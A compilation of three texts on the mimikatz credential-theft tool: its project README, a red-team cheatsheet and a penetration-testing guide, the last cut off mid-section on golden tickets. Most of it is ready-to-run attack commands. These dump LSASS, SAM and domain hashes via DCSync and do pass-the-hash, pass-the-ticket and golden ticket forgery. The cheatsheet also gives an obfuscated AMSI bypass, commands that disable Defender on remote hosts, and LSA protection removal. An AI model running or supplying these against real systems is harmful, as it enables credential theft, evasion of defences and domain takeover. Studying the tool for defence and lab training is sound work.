# mimikatz

[](https://github.com/ParrotSec/mimikatz#mimikatz)

**`mimikatz`** is a tool I've made to learn `C` and make somes experiments with Windows security.

It's now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. **`mimikatz`** can also perform pass-the-hash, pass-the-ticket or build _Golden tickets_.

```
  .#####.   mimikatz 2.0 alpha (x86) release "Kiwi en C" (Apr  6 2014 22:02:03)
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                    with  13 modules * * */


mimikatz # privilege::debug
Privilege '20' OK
 
mimikatz # sekurlsa::logonpasswords
 
Authentication Id : 0 ; 515764 (00000000:0007deb4)
Session           : Interactive from 2
User Name         : Gentil Kiwi
Domain            : vm-w7-ult-x
SID               : S-1-5-21-1982681256-1210654043-1600862990-1000
        msv :
         [00000003] Primary
         * Username : Gentil Kiwi
         * Domain   : vm-w7-ult-x
         * LM       : d0e9aee149655a6075e4540af1f22d3b
         * NTLM     : cc36cf7a8514893efccd332446158b1a
         * SHA1     : a299912f3dc7cf0023aef8e4361abfc03e9a8c30
        tspkg :
         * Username : Gentil Kiwi
         * Domain   : vm-w7-ult-x
         * Password : waza1234/
...
```

But that's not all! `Crypto`, `Terminal Server`, `Events`, ... lots of informations in the GitHub Wiki [https://github.com/gentilkiwi/mimikatz/wiki](https://github.com/gentilkiwi/mimikatz/wiki) or on [http://blog.gentilkiwi.com](http://blog.gentilkiwi.com/) (in French, _yes_).

If you don't want to build it, binaries are availables on [https://github.com/gentilkiwi/mimikatz/releases](https://github.com/gentilkiwi/mimikatz/releases)

## Quick usage

[](https://github.com/ParrotSec/mimikatz#quick-usage)

```
log
privilege::debug
```

### sekurlsa

[](https://github.com/ParrotSec/mimikatz#sekurlsa)

```
sekurlsa::logonpasswords
sekurlsa::tickets /export

sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
```

### kerberos

[](https://github.com/ParrotSec/mimikatz#kerberos)

```
kerberos::list /export
kerberos::ptt c:\chocolate.kirbi

kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi
```

### crypto

[](https://github.com/ParrotSec/mimikatz#crypto)

```
crypto::capi
crypto::cng

crypto::certificates /export
crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE

crypto::keys /export
crypto::keys /machine /export
```

### vault & lsadump

[](https://github.com/ParrotSec/mimikatz#vault--lsadump)

```
vault::cred
vault::list

token::elevate
vault::cred
vault::list
lsadump::sam
lsadump::secrets
lsadump::cache
token::revert

lsadump::dcsync /user:domain\krbtgt /domain:lab.local
```

## Build

[](https://github.com/ParrotSec/mimikatz#build)

`mimikatz` is in the form of a Visual Studio Solution and a WinDDK driver (optional for main operations), so prerequisites are:

- for `mimikatz` and `mimilib` : Visual Studio 2010, 2012 or 2013 for Desktop (**2013 Express for Desktop is free and supports x86 & x64** - [http://www.microsoft.com/download/details.aspx?id=44914](http://www.microsoft.com/download/details.aspx?id=44914))
- _for `mimikatz driver`, `mimilove` (and `ddk2003` platform) : Windows Driver Kit **7.1** (WinDDK) - [http://www.microsoft.com/download/details.aspx?id=11800](http://www.microsoft.com/download/details.aspx?id=11800)_

`mimikatz` uses `SVN` for source control, but is now available with `GIT` too! You can use any tools you want to sync, even incorporated `GIT` in Visual Studio 2013 =)

### Synchronize!

[](https://github.com/ParrotSec/mimikatz#synchronize)

- GIT URL is : [https://github.com/gentilkiwi/mimikatz.git](https://github.com/gentilkiwi/mimikatz.git)
- SVN URL is : [https://github.com/gentilkiwi/mimikatz/trunk](https://github.com/gentilkiwi/mimikatz/trunk)
- ZIP file is : [https://github.com/gentilkiwi/mimikatz/archive/master.zip](https://github.com/gentilkiwi/mimikatz/archive/master.zip)

### Build the solution

[](https://github.com/ParrotSec/mimikatz#build-the-solution)

- After opening the solution, `Build` / `Build Solution` (you can change architecture)
- `mimikatz` is now built and ready to be used! (`Win32` / `x64` even `ARM64` if you're lucky)
    - you can have error `MSB3073` about `_build_.cmd` and `mimidrv`, it's because the driver cannot be build without Windows Driver Kit **7.1** (WinDDK), but `mimikatz` and `mimilib` are OK.

### ddk2003

[](https://github.com/ParrotSec/mimikatz#ddk2003)

With this optional MSBuild platform, you can use the WinDDK build tools, and the default `msvcrt` runtime (smaller binaries, no dependencies)

For this optional platform, Windows Driver Kit **7.1** (WinDDK) - [http://www.microsoft.com/download/details.aspx?id=11800](http://www.microsoft.com/download/details.aspx?id=11800) and Visual Studio **2010** are mandatory, even if you plan to use Visual Studio 2012 or 2013 after.

Follow instructions:

- [http://blog.gentilkiwi.com/programmation/executables-runtime-defaut-systeme](http://blog.gentilkiwi.com/programmation/executables-runtime-defaut-systeme)
- _[http://blog.gentilkiwi.com/cryptographie/api-systemfunction-windows#winheader](http://blog.gentilkiwi.com/cryptographie/api-systemfunction-windows#winheader)_

## Licence

[](https://github.com/ParrotSec/mimikatz#licence)

CC BY 4.0 licence - [https://creativecommons.org/licenses/by/4.0/](https://creativecommons.org/licenses/by/4.0/)

`mimikatz` needs coffee to be developed:

- PayPal: [https://www.paypal.me/delpy/](https://www.paypal.me/delpy/)

## Author

[](https://github.com/ParrotSec/mimikatz#author)

- Benjamin DELPY `gentilkiwi`, you can contact me on Twitter ( @gentilkiwi ) or by mail ( benjamin [at] gentilkiwi.com )
- DCSync and DCShadow functions in `lsadump` module were co-writed with Vincent LE TOUX, you can contact him by mail ( vincent.letoux [at] gmail.com ) or visit his website ( [http://www.mysmartlogon.com](http://www.mysmartlogon.com/) )

This is a **personal** development, please respect its philosophy and don't use it for bad things!

**Credit:** This information was adapted from an excellent guide on [GitHub](https://github.com/ParrotSec/mimikatz). Be sure to check out the original post for more details.

# **Mimikatz Cheatsheet**

![](https://miro.medium.com/v2/resize:fit:680/1*knDnDqe4G4CVuEYeerDPlw.jpeg)

**TL;DR** Mimikatz cheatsheet of things I have found useful in [CRTP](https://happycamper84.medium.com/certified-red-team-professional-crtp-exam-course-my-experience-4907dd6f5edc) and the lab.

Welcome to Part I of our cheatsheet series compiled from various courses, labs, stuff we did at work, Google, etc. Most of this was spread out over various howtos. This puts it all in one place. These are cheatsheets, almost no explanation is given, just commands. The links are to howtos that provide background.

Part I: [Mimikatz cheatsheet](https://happycamper84.medium.com/mimikatz-cheatsheet-ad2b88059b4)

Part II: [Set-Acl cheatsheet](https://happycamper84.medium.com/set-acl-cheatsheet-6c79e0c2f32b)

Part III: [Get-Acl cheatsheet](https://happycamper84.medium.com/get-acl-cheatsheet-f7871edf247f)

Part IV: [Enumerating AD cheatsheet](https://happycamper84.medium.com/ad-enumeration-cheatsheet-55a95535f3ee)

Part V: [Windows reverse shells cheatsheet](https://happycamper84.medium.com/windows-reverse-shells-cheatsheet-5eeb09b28c8e)

Part VI: [MS Graph PowerShell cheatsheet](https://happycamper84.medium.com/microsoft-graph-powershell-cheatsheet-d8a841bafa09)

Part VII: [Hash cracking cheatsheet](https://happycamper84.medium.com/hash-cracking-cheatsheet-7c10f2b31143)

Part VIII: [The Credential Theft Shuffle](https://happycamper84.medium.com/the-credential-theft-shuffle-54ec6cd32ea5)

Part IX: [SACLs & Querying Collected Logs](https://happycamper84.medium.com/dangerous-rights-logging-cheatsheet-4b455b686e15)

Part X: [Setting up a simple AD lab in Azure](https://happycamper84.medium.com/how-to-setup-an-ad-lab-in-azure-48a19ff5081b)

**Background**

Yes, this info is out there already, most notably [Sean Metcalf’s Guide to Mimikatz](https://adsecurity.org/?page_id=1821). This is just my personal cheatsheet for Mimikatz compiled from my notes taken during various labs, the [CRTP course](https://happycamper84.medium.com/certified-red-team-professional-crtp-exam-course-my-experience-4907dd6f5edc), etc.

Please note that I was using Invoke-Mimikatz.ps1 most of the time, therefore my cheatsheet is heavy on commands in that syntax. Generally speaking, if you’re using the *.exe then just run what is inside the quotes. I am also partial to PowerShell_ISE.

Please note that you can run multiple commands with Invoke-Mimikatz.ps1 by simply enclosing the entire thing in single quotes and each command in double quotes. Example:

Invoke-Mimikatz -Command ‘”token::elevate” “privilege::debug” “sekurlsa::msv”’

Please note that Medium often mangles quotations, even in codeblocks. If you copy/paste a command and get an error then re-type the quotes in the CLI.

**Running Mimikatz at all**

Defender will block an unaltered copy of Mimikatz. Please do NOT rely on this alone in the workplace. Mimikatz is open source and freely available, therefore a dedicated attacker will simply modify it enough to not trip Defender. [These researchers did it just to prove a point](https://github.com/fir3d0g/mimidogz). Therefore [focus on denying an attacker the rights needed to dump credentials](https://happycamper84.medium.com/mitigating-mimikatz-d9441eaaf20c). Failing that, [focus on basic security hygiene so there isn’t anything usable in the dump](https://happycamper84.medium.com/laps-for-preventing-credential-theft-in-a-windows-domain-e6c040a1eac3).

With that disclaimer out of the way, here is how I have used Mimikatz in labs, [CRTP](https://happycamper84.medium.com/certified-red-team-professional-crtp-exam-course-my-experience-4907dd6f5edc), etc.

Launch PowerShell as admin, add a folder exception to Defender, turn off real time monitoring:

Start-Process PowerShell_ISE -Verb RunASAdd-MpPreference -ExclusionPath “C:\Temp”Set-MpPreference -DisableRealTimeMonitoring $trueImport-Module C:\Temp\Invoke-Mimikatz.ps1

Alternatively you can often get away with just running the AMSI bypass if you can’t turn off Defender. I have used this tactic with PowerView and PowerUp in the past:

S`eT-It`em ( ‘V’+’aR’ + ‘IA’ + (‘blE:1’+’q2') + (‘uZ’+’x’) ) ( [TYpE]( “{1}{0}”-F’F’,’rE’ ) ) ; ( Get-varI`A`BLE ( (‘1Q’+’2U’) +’zX’ ) -VaL ).”A`ss`Embly”.”GET`TY`Pe”(( “{6}{3}{1}{4}{2}{0}{5}” -f(‘Uti’+’l’),’A’,(‘Am’+’si’),(‘.Man’+’age’+’men’+’t.’),(‘u’+’to’+’mation.’),’s’,(‘Syst’+’em’) ) ).”g`etf`iElD”( ( “{0}{2}{1}” -f(‘a’+’msi’),’d’,(‘I’+’nitF’+’aile’) ),( “{2}{4}{0}{1}{3}” -f (‘S’+’tat’),’i’,(‘Non’+’Publ’+’i’),’c’,’c,’ )).”sE`T`VaLUE”( ${n`ULl},${t`RuE} )

![](https://miro.medium.com/v2/resize:fit:700/1*QUvzBD5C16aSqJ2hZ3Edcw.jpeg)

**Bypassing LSA protection**

Additionally, if Mimkatz has an issue with LSA protection this can be disabled by the local admin. If this issue occurs you will likely see something along the lines of

ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)

This protection can be disabled by loading a Mimikatz driver, and credentials can then be dumped.

!+  
!processprotect /process:lsass.exe /remove  
privilege::debug  
sekurlsa::logonpasswords

![](https://miro.medium.com/v2/resize:fit:594/1*OKP3Kh_OLrhJh8UiN3Fgqw.jpeg)

**Dumping creds with Mimikatz:**

This is normally required first if running Mimikatz locally:

Invoke-Mimikatz -Command ‘“token::elevate”’Invoke-Mimikatz -Command ‘“privilege::debug”’Invoke-Mimikatz -Command ‘“sekurlsa::logonpasswords”’

Please note that ‘logonpasswords’ lists everything except Credential Manager, as I found out once.

List the sekurlsa commands:

“sekurlsa::help”

Check Credential Manager for things like saved RDP passwords:

Invoke-Mimikatz -Command ‘“token::elevate” “vault::cred /patch”’Invoke-Mimikatz -Command '"sekurlsa::credman"'

If you are using mimikatz.exe:

Start-Process C:\Temp\mimikatz_trunk\x64\mimikatz.exe -Verb RunAstoken::elevateprivilege::debugsekurlsa::msv

![](https://miro.medium.com/v2/resize:fit:585/1*DpB1n7ZBeLYZ7fnobzTjQQ.jpeg)

Other useful things to dump:

vault::cred #dump Credential Manager  
  
lsadump::sam #dump the SAM  
  
lsadump::cache #dump cached Domain credentials (these must be cracked, PTH doesn't work on mscache)

**Pass-The-Hash (PTH) with Mimikatz**

Explanation, lab demo, and mitigations are [here](https://happycamper84.medium.com/generating-a-golden-ticket-in-the-lab-4740efa22f34).

PTH and launch PowerShell_ISE as that user:

Invoke-Mimikatz -Command ‘“sekurlsa::pth /user:administrator /domain:corp /ntlm:03df526c49c8684ebed22fdb3ec5c533 /run:PowerShell_ISE”’

**Pass-The-Ticket (PTT) with Mimikatz**

Explanation, lab demo, and mitigations are [here](https://happycamper84.medium.com/unconstrained-delegation-ptt-fa8a72eec34d).

Export & list tickets:

$sess = New-PSSession -ComputerName TestIPAMInvoke-Command -ScriptBlock {Set-MpPreference –DisableRealTimeMonitoring $true} -ComputerName TestIPAMInvoke-Command -FilePath C:\Temp\Invoke-Mimikatz.ps1 -Session $sessEnter-PSSession $sessmkdir etccd .\etcInvoke-Mimikatz -Command ‘“sekurlsa::tickets /export”’

Copy/paste the name of the ticket to elevate with, then:

Invoke-Mimikatz -Command ‘“kerberos::ptt .\<ticket filename>”’

Confirm privileges:

Invoke-Command -ScriptBlock {hostname;whoami} -ComputerName TestDC

Show tickets currently in use:

klist

If you are having issues or getting weird errors, purge tickets and try again:

klist purge

**Dump creds remotely with Mimikatz**

This only requires that you are running as a Domain User who has local admin rights on the remote system.

Invoke-Command –ScriptBlock {Set-MpPreference –DisableRealTimeMonitoring $true} –ComputerName DCInvoke-Mimikatz -DumpCreds -ComputerName DC

**DCSync**

Explanation & lab demo [here](https://happycamper84.medium.com/generating-a-golden-ticket-in-the-lab-4740efa22f34).

Grab the krbtgt NTLM

Invoke-Mimikatz -Command ‘”lsadump::dcsync /user:corp\krbtgt”’

Forge a Golden Ticket using krbtgt hash & domain SID:

Invoke-Mimikatz -Command ‘”kerberos::golden /domain:corp.local /sid:S-1–5–21–1917967189–4054103991–136247481 /krbtgt:cb542d2484aae7b5156c9a1a7bbb31e7 /user:Administrator /id:500 /ptt”’

Alternatively, save the ticket for future use:

kerberos::golden /domain:corp.local /sid:S-1–5–21–1917967189–4054103991–136247481 /krbtgt:cb542d2484aae7b5156c9a1a7bbb31e7 /user:Administrator /id:500 /ticket:forged.kirbikerberos::ptt forged.kirbimisc::cmd

Dump every hash in the domain into a file for use later:

Invoke-Mimikatz -Command ‘“token::elevate” “privilege::debug” “lsadump::dcsync /dc:BackupDC4 /domain:test.local /all /csv”’ | Export-Csv .\AllHashes.csv

**Forge a ticket to use in a trusting domain**

In this case we have compromised a child domain and want to escalate to the parent domain. There is a trust relationship between them.

Invoke-Mimikatz -Command ‘“kerberos::golden /user:Administrator /domain:<child domain FQDN> /sid:<child domain SID> /sids:<parent domain SID>-519 /krbtgt:<child domain krbtgt NTLM> /ticket:C:\AD\Tools\krbtgt_tkt.kirbi”’

Load the ticket and start using privs in the parent domain:

Invoke-Mimikatz -Command ‘“kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi”’

**References**

Benjamin Delpy’s github with Mimikatz: [https://github.com/ParrotSec/mimikatz](https://github.com/ParrotSec/mimikatz)

Sean Metcalf’s guide to Mimikatz: [https://adsecurity.org/?page_id=1821](https://adsecurity.org/?page_id=1821)

Microsoft Docs on klist: [https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/klist](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/klist)

**Credit:** This information was adapted from an excellent guide on [Medium](https://happycamper84.medium.com/mimikatz-cheatsheet-ad2b88059b4). Be sure to check out the original post for more details.

# How to use Mimikatz for Hacking in 2024: The Definitive Guide

May 13, 2024 / By  [Adam Goss](https://www.stationx.net/author/adam-goss/ "Adam Goss")

![How to Use Mimikatz](https://www.stationx.net/wp-content/uploads/2024/02/How-to-Use-Mimikatz.png)

[](https://www.linkedin.com/shareArticle?title=How%20to%20use%20Mimikatz%20for%20Hacking%20in%202024%3A%20The%20Definitive%20Guide&url=https%3A%2F%2Fwww.stationx.net%2Fhow-to-use-mimikatz%2F&mini=true)[](https://x.com/intent/post?text=How%20to%20use%20Mimikatz%20for%20Hacking%20in%202024%3A%20The%20Definitive%20Guide&url=https%3A%2F%2Fwww.stationx.net%2Fhow-to-use-mimikatz%2F)[](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.stationx.net%2Fhow-to-use-mimikatz%2F)

__Listen to the article

This comprehensive guide will show you how to use Mimikatz for hacking so you can dump credentials and perform lateral movement like a pro.

Mimikatz is one of the most popular hacking tools you’ll use and is an industry-standard for penetration testing and red team engagements. 

It is featured on many of the top hacking certifications like the Offensive Security Certified Professional (OSCP), Practical Network Penetration Tester (PNPT), and Certified Red Team Operator (CRTO), making it a tool you need to know how to use. This guide will show you how.

You will learn to extract passwords, dump credentials, create golden tickets, and perform attacks like pass-the-hash and over-pass-the-hash. 

These are fundamental skills in any hacker's arsenal, and Mimkatz is a tool that can do it all. But before we do the cool hacking stuff, what is Mimikatz?

Let’s find out.

## What Is Mimikatz?

Mimikatz is an open-source hacking tool that extracts credential information from compromised machines. 

It was created by Benjamin Delpy as a proof of concept to highlight how Microsoft authentication protocols, like Windows New Technology LAN Manager (NTLM), were vulnerable to attacks. 

Since then, it has become the defacto [post-exploitation tool](https://www.stationx.net/network-penetration-testing-tools/) in the penetration testing and red team space, with many certifications requiring you to know how to use it.

Hackers will use Mimikatz in the [post-exploitation phase](https://www.stationx.net/penetration-testing-steps/) of an attack. This phase begins after you successfully compromise a machine and gain unauthorized access. 

During this phase, you’ll perform various post-exploitation activities, such as gathering information about the system and internal network, [escalating your privileges](https://www.stationx.net/windows-privilege-escalation/), and creating persistence mechanisms. This is where Mimikatz comes in.

Mimikatz can extract credential data from memory or on-disk password stores, including plaintext passwords, pin codes, Kerberos tickets, and NTLM password hashes. 

It can then use this stolen credential data to perform lateral movement and target other machines within the local network. This process works as follows:

1. You gain initial access to one machine.
2. You use Mimikatz to extract credential information stored on it.
3. You use that information to authenticate to other machines or network resources within the local network by creating golden tickets or using attacks like pass-the-hash (PtH) and over-pass-the-hash (pass-the-key).

Key Features of Mimikatz:

- **Credential dumping** from memory and on-disk
- **Kerberos attacks**, such as golden ticket and over-pass-the hash
- **NTLM attacks** like pass-the-hash
- **Token impersonation**
- **Privilege escalation** by exploiting vulnerabilities like Print Spooler
- **Defense evasion** by clearing Windows event logs or injecting into legitimate processes

To provide these capabilities, Mimikatz uses various modules that add functionality to the core tool. Let’s take a look at them.

## Understanding Mimikatz Modules

Mimikatz is made up of 17 modules. Each module provides a specific functionality that allows you to perform post-exploitation activities, such as stealing credentials, escalating your privileges, or performing lateral movement. 

The key modules you will use most often are:

- `sekurlsa`: Used to extract passwords, keys, pin codes, hashes, and tickets from the memory of the [Local Security Authority Subsystem Service](https://www.microsoft.com/en-us/security/blog/2022/10/05/detecting-and-preventing-lsass-credential-dumping-attacks/) (LSASS).
- `lsadump`: Used for dumping the Windows [Security Account Manager](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc756748(v=ws.10)) (SAM) database and Local Security Authority (LSA). It contains the NT and LM hashes of users. 
- `kerberos:` Used to interact with the Kerberos authentication protocol through API calls or perform Kerberos attacks, such as creating golden or silver tickets and extracting Kerberos service tickets.
- `privilege:` Used to access commands to check and manipulate your process’s privileges inside Mimikatz. 
- `token:` Used to check and manipulate your Windows tokens. 
- `vault:` Used for dumping passwords saved in the Windows Vault. Typically, web browser or other application passwords.

These modules leverage vulnerabilities, weaknesses, or design features in the Windows system to achieve their objectives. 

For example, the `sekurlsa` module exploits a weakness in the design of the NTLM authentication protocol. A user can authenticate with another user’s password without knowing their plaintext password—a [pass-the-hash attack](https://www.stationx.net/pass-the-hash-attack/).

Due to how these modules interact with the Windows operating system, you often need to run Mimikatz as a privileged process to unlock most of its features. 

A privileged process has elevated permissions beyond a regular process and is usually achieved by executing Mimikatz as the Administrator or system user. The following demos will be performed using elevated privileges.

To learn more about how to elevate your privileges, read [How to Use Windows Privilege Escalation: Elevate Your Skills](https://www.stationx.net/windows-privilege-escalation/).

## Things to Keep in Mind When Using Mimikatz

At this point, you may be worried—or excited—that such a powerful tool exists; a tool capable of stealing credentials and pivoting around the network unhindered. In reality, this is not exactly true. 

Mimikatz is an old tool heavily used by penetration testers, red teamers, and real-world hackers. As such, sophisticated detections and mitigations have been built into security tools and even the Windows operating system that can catch Mimikatz and block it. 

If you just download and run Mimikatz on a machine running Windows 10+, you will not be successful; Microsoft Defender will block it, and you will fail. 

However, there are ways you can get Mimikatz to run. Firstly, as discussed previously, you must run it with administrative privileges or system-level ones. Secondly, you must incorporate defense evasion tactics and techniques to bypass security mechanisms. Examples include:

- Running Mimikatz in-memory to avoid on-disk detections like anti-virus scans.
- Disabling the Windows Antimalware Scan Interface (AMSI) to evade memory scanning. 
- Bypassing application whitelisting by injecting your Mimikatz process into a legitimate process.
- Evading behavioral detections using parent process spoofing.

That said, these evasion techniques fall outside the scope of this article and won’t be used in the following demonstrations. Instead, you will see Mimkatz executed on disk on a Windows machine that has anti-virus and malware protections disabled. 

To explore detection evasion when using Mimikatz, check out the `dpapi` and `process` modules. These modules allow you to customize the execution behaviour of Mimikatz to bypass common protections. Also, consider using a Command and Control (C2) framework like [PowerShell Empire](https://www.stationx.net/how-to-use-powershell-empire/) with inbuilt evasion techniques.

That’s enough talk. Let’s jump in and see Mimikatz in action! 

## Extracting Plaintext Passwords

One of the first post-exploitation activities you want to perform is searching for information on the system you just compromised. This could be configuration files, sensitive documents, or a user’s plaintext passwords. 

Mimikatz can help you do this with its `sekurlsa` module, which can extract passwords, private keys, pin codes, and tickets from the memory of LSASS. 

To extract plaintext passwords with the `sekurlsa` module, you can use the `logonpasswords` command. This command lists all the available provider credentials, including the most recently logged-on user accounts and computer credentials.

First, you must turn off all Windows Security settings, [download Mimikatz](https://github.com/gentilkiwi/mimikatz/releases), and run it as Administrator by right-clicking on the application.

[![Extracting Plaintext Passwords](https://www.stationx.net/wp-content/uploads/2024/02/1.-Extracting-Plaintext-Passwords.jpg)](https://www.stationx.net/wp-content/uploads/2024/02/1.-Extracting-Plaintext-Passwords.jpg)

Once you execute Mimikatz, a terminal window will appear displaying the Mimikatz interface.

[![Displaying the Mimikatz Interface](https://www.stationx.net/wp-content/uploads/2024/02/2.-Displaying-the-Mimikatz-Interface.jpg)](https://www.stationx.net/wp-content/uploads/2024/02/2.-Displaying-the-Mimikatz-Interface.jpg)

At this point, you need to run the command `privilege::debug`. This command will request the debug privilege for your current Mimikatz process. If you are running as the Administrator or system user, this should be successful, indicated by a `Privilege ‘20’ OK` output. 

The debug privilege lets you debug and adjust the memory of a process owned by another user account—a requirement for extracting plaintext passwords from LSASS.

[![Debug Privilege](https://www.stationx.net/wp-content/uploads/2024/02/3.-Debug-Privilege.jpg)](https://www.stationx.net/wp-content/uploads/2024/02/3.-Debug-Privilege.jpg)

Now, you can move on to extracting passwords. Run the command `sekurlsa::logonpasswords` to list all the users who have recently logged onto the system. Their login data will be stored in the memory of LSASS, ready for you to extract. 

[![Sekurlsa Logonpasswords](https://www.stationx.net/wp-content/uploads/2024/02/4.-Sekurlsa-Logonpasswords.jpg)](https://www.stationx.net/wp-content/uploads/2024/02/4.-Sekurlsa-Logonpasswords.jpg)

This command gives a lot of output. Scrolling down, you can find a user logged into the machine or who recently logged out.

[![Find a User Logged Into the Machine](https://www.stationx.net/wp-content/uploads/2024/02/5.-Find-a-User-Logged-Into-the-Machine.jpg)](https://www.stationx.net/wp-content/uploads/2024/02/5.-Find-a-User-Logged-Into-the-Machine.jpg)

The listing shows three things:

1. The user’s name: `StationX-user`.
2. The user’s NTLM and SHA1 password hashes: These can be cracked to reveal the user’s password or used in a pass-the-hash attack to perform lateral movement.
3. The user’s plaintext password: This is shown because the legacy WDigest security provider is enabled on this machine. It looks like they are a fan of Nathan.

WDigest is disabled by default on modern Windows operating systems. If you want to enable it to follow along with the demo above, run the following command in a terminal as Administrator: `reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1`

**Check Out Our Premium Hacking Cheat Sheets!**

Want access to all our hacking tools cheat sheets? Just enter your email address, and we’ll send access to your inbox.

**DOWNLOAD →**

Extracting passwords from the memory of LSASS is not the only place you can gather credential information with Mimikatz. Let’s take a look at a few more.

## Dumping Credentials From LSA and SAM

Another data store you can dump credentials from is the LSA and SAM databases. These are loaded every time a Windows machine is booted up, and if you have debug privileges, you can dump credentials from them using the Mimkatz `lsadump` module.

The `lsadump` module has one command for dumping LSA data and one for dumping the contents of the SAM database. 

As before, you must run Mimikatz as an admin or system user and obtain debug privileges with the command `privilege::debug`. Once you do this, you can dump LSA data by executing `lsadump::lsa /inject`. 

[![Dumping Credentials From LSA and SAM](https://www.stationx.net/wp-content/uploads/2024/02/6.-Dumping-Credentials-From-LSA-and-SAM.jpg)](https://www.stationx.net/wp-content/uploads/2024/02/6.-Dumping-Credentials-From-LSA-and-SAM.jpg)

Scrolling down the output, you can see that the command dumps the NTLM hashes for users who have logged on recently, like `StationX-user`, and users who do not have their login credentials stored in LSASS memory, like `StationX-admin`. 

[![Command Dumps the NTLM Hashes for Users](https://www.stationx.net/wp-content/uploads/2024/02/7.-Command-Dumps-the-NTLM-Hashes-for-Users.jpg)](https://www.stationx.net/wp-content/uploads/2024/02/7.-Command-Dumps-the-NTLM-Hashes-for-Users.jpg)

You can use these password hashes in pass-the-hash or overpass-the-hass Mimikatz attacks.

The `/inject` option will dump NTLM password hashes when executed on a workstation. If executed on a domain controller, it will dump the NTLM, Wdigest, Kerberos keys, and password history.

To dump credentials stored within the SAM database, you must first elevate your privileges from Administrator to system. This is done by running the command `token::elevate`.

[![Elevate Your Privileges From Administrator to System](https://www.stationx.net/wp-content/uploads/2024/02/8.-Elevate-Your-Privileges-From-Administrator-to-System.jpg)](https://www.stationx.net/wp-content/uploads/2024/02/8.-Elevate-Your-Privileges-From-Administrator-to-System.jpg)

Once you have system privileges, run the command `lsadump::sam`.

[![Run the Command lsadump sam](https://www.stationx.net/wp-content/uploads/2024/02/9.-Run-the-Command-lsadump-sam.jpg)](https://www.stationx.net/wp-content/uploads/2024/02/9.-Run-the-Command-lsadump-sam.jpg)

Here you get the same NTLM hashes for all users on the system, regardless of whether their encrypted login data is still stored in memory. 

[![NTLM hashes](https://www.stationx.net/wp-content/uploads/2024/02/10.-NTLM-hashes.jpg)](https://www.stationx.net/wp-content/uploads/2024/02/10.-NTLM-hashes.jpg)

The method you choose to dump local credentials will depend on the level of access you can reach, operational security concerns, and the type of credential data you want to steal. 

## Extracting and Using Kerberos Tickets

Nowadays, stealing NTLM hashes is usually insufficient to pivot around corporate networks. 

Modern Windows environments have adopted the Kerberos authentication protocol to provide Active Directory networks with significantly stronger security. 

Kerberos is a ticket-based authentication protocol that exploits Windows functionality and uses a Key Distribution Center (KDC) to issue tickets to clients (workstations) who use these tickets to access network resources. There are two types of tickets that the KDC will issue clients:

- **Ticket Granting Ticket** (TGT) that verifies the user’s identity (who they are).
- **Ticket Granting Service** (TGS) ticket that verifies the user’s permissions (what they can access).

You can extract these tickets from a compromised machine to authenticate as another user and access resources they have permission to access.

For an in-depth guide on Kerberos and how it can be attacked, check out [How to Perform Kerberoasting Attacks: The Ultimate Guide](https://www.stationx.net/how-to-perform-kerberoasting-attacks/).

To extract Kerberos tickets from a machine you are logged into, you must run Mimikatz as Administrator and obtain debug privileges with the command `privilege::debug`. 

Once this is set up, you can execute `sekurlsa::tickets` to list all available Kerberos tickets for all recently authenticated users (Kerberos tickets are stored in memory). 

[![Extracting and Using Kerberos Tickets](https://www.stationx.net/wp-content/uploads/2024/02/11.-Extracting-and-Using-Kerberos-Tickets.jpg)](https://www.stationx.net/wp-content/uploads/2024/02/11.-Extracting-and-Using-Kerberos-Tickets.jpg)

There is a lot of output from this command. To export these tickets for use, append the `/export` option to the command. 

[![Export Option to the Command](https://www.stationx.net/wp-content/uploads/2024/02/12.-Export-Option-to-the-Command.jpg)](https://www.stationx.net/wp-content/uploads/2024/02/12.-Export-Option-to-the-Command.jpg)

Tickets are exported to `.kirbi` files starting with the user’s Locally Unique Identifier (LUID) and group number (0 = TGS, 1 = client ticket, and 2 = TGT).

[![Tickets Are Exported to .kirbi Files](https://www.stationx.net/wp-content/uploads/2024/02/13.-Tickets-Are-Exported-to-.kirbi-Files.jpg)](https://www.stationx.net/wp-content/uploads/2024/02/13.-Tickets-Are-Exported-to-.kirbi-Files.jpg)

Once you have extracted another user’s Kerberos ticket, you can use it to authenticate as that user and access network resources they have permission to access. Let’s take a look at a few ways you can do that. 

When extracting Kerberos tickets, finding out what tickets can get you access to what resources is useful. A great [tool to do this is Bloodhound](https://www.stationx.net/how-to-use-bloodhound-active-directory/). It can perform Active Directory reconnaissance and map out attack paths you can follow using the tickets you steal.

**Check Out Our Premium Hacking Cheat Sheets!**

Want access to all our hacking tools cheat sheets? Just enter your email address, and we’ll send access to your inbox.

**DOWNLOAD →**

## Creating Golden Tickets

One way to use the Kerberos tickets you extract is by creating golden tickets. Golden tickets are TGTs that use the domain KDC service account’s (KRBTGT) NTLM password hash to sign and encrypt them. 

They allow you to impersonate any user in the domain and provide you access to every resource. 

To generate a golden ticket using Mimikatz, you must specify several mandatory pieces of information:

- The domain name `/domain` 
- The Security Identifier (SID) of the domain `/sid`
- The username you want to impersonate `/user`; this does not have to be a real domain user.
- The KRBTGT account’s NTLM password hash `/krbtgt`
- The location to save the golden ticket `/ticket`; you can use `/ptt` if you want to inject the forged ticket into memory for use immediately

You should be able to get all this information from the previous `lsadump::lsa /inject /user:krbtgt` command.

[![Creating Golden Tickets](https://www.stationx.net/wp-content/uploads/2024/02/14.-Creating-Golden-Tickets.jpg)](https://www.stationx.net/wp-content/uploads/2024/02/14.-Creating-Golden-Tickets.jpg)

Once you’ve gathered all of this data, you can append it to the command `kerberos::golden` command to generate a golden ticket.

